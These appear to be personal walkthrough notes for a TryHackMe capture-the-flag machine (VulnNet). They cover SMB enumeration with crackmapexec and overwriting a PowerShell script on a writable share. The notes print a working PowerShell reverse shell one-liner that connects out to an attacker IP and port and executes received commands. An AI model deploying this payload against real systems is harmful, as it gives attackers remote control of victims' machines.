I think we have got one key but have to enumerate some more as we have to find system.txt 
or we don't have permission from the terminal

https://github.com/n0b0dyCN/redis-rogue-server

not able to get the reverse shell using this technique
f_d58c1999119dcb9ea907415a6836d9f04c2512c2
THM{3eb176aee96432d5b100bc93580b291e}

There's a twist in the story as i run the crackmapexec on the smb port and volla got something
![[Pasted image 20230916173043.png]]

```
[*] Copying default configuration file
SMB         10.10.72.213    445    VULNNET-BC3TCK1  [*] Windows 10.0 Build 17763 x64 (name:VULNNET-BC3TCK1) (domain:vulnnet.local) (signing:True) (SMBv1:False)

```
We got something juicy here that's the name of the domain 
name:VULNNET-BC3TCK1
domain:vulnnet.local

@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md#powershell

Will upload our edited file with Put command
smb: \> put PurgeIrrelevantData_1826.ps1
and to get out from the more we have to press q twice


And to run the above file will fire off
This is the code that we have updated in the .ps1 and note one thing we have removed 
```
$client = New-Object System.Net.Sockets.TCPClient('10.8.167.78',4242);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
```

![[Pasted image 20230917193054.png]]

Whoooooooooo-Hoooooooooooooooooo got the shell 
![[Pasted image 20230917193235.png]]
